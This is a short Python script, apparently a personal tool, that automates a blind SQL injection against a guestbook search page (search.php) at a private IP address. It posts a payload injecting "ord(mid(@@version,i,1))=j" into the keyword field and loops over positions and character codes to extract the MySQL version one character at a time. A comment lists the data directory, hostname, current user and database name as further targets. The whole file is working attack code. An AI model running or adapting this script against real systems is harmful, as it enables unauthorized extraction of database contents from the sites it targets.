#!/bin/env python
import requests
import json
import time
import sys

def get_http(Pyurl,timeout,prt_head):
    headers = {
    'user-agent': 'curl/7.99.0'
    }
    try:
        s = requests.session()
        # s.proxies = {'http':'118.114.77.47:8080'}
        # s.cookies = {}
        r = s.get(Pyurl,headers=headers,timeout=timeout,verify=False)
        r.encoding = 'utf-8'
        #print(r.status_code)
        if prt_head:
            print('Server:' + r.headers['Server'])
        else:
            print(r.text)
    except requests.RequestException as e:
        print(e)
    except Exception as e:
        print(format(e))

def post_http(Pyurl,timeout,i,j):
    headers = {
    'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/60.0',
    'Content-Type':	'application/x-www-form-urlencoded'
    }
    try:
        # select @@datadir,@@hostname,user(),database();
        payload="keyword=123' and ord(mid(@@version,"+ str(i) +",1))="+ str(j) +" #&search=%D5%BE%C4%DA%CB%D1%CB%F7"
        # print(payload)
        s = requests.session()
        r = s.post(Pyurl,headers=headers,data=payload,timeout=timeout,verify=False)
        result = r.text
        if result.find('123') >= 0:
            now = time.strftime('%m-%d %H:%M:%S',time.localtime(time.time()))
            print chr(j),
            # print("[" + now + "] "+ str(i) +"-> " + chr(j))
    except Exception as e:
        print(format(e))

for i in range(1,32):
    for j in range(32,126):
        conn_url="http://172.16.24.76/gtbook/search.php"
        post_http(conn_url,10,i,j)
